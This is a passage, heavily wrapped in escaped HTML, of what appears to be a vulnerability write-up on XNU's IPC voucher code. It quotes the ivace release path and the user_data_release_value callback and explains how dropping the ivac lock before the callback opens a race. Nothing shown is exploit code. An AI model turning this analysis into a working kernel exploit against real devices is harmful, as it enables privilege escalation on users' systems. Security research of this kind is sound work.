pending,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* let it handle this later return when&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the previous reply comes in.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* claim releasing */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_index_to_key&lt;/span&gt;&lt;span&gt;&amp;nbsp;goes back from the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the key value (which in practice will be 1 greater than the key index.) Then the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_entry&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;is marked as &amp;quot;releasing&amp;quot;. The code continues:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2d8847df4f2d48c8c26863add2566524e8dbcae8"&gt;&lt;/a&gt;&lt;a id="t.44"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(!&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;else&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Note that we enter this snippet with the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock held. The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;values are read under that lock, then the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock is dropped and the attribute managers &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;callback is called:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.878791384d9e68560db9fcecd2cc8d16dddfac08"&gt;&lt;/a&gt;&lt;a id="t.45"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Here&amp;#39;s the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;callback:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3ccebbb1131353580cda71b6754e18fb5fd88dab"&gt;&lt;/a&gt;&lt;a id="t.46"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; sync&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span 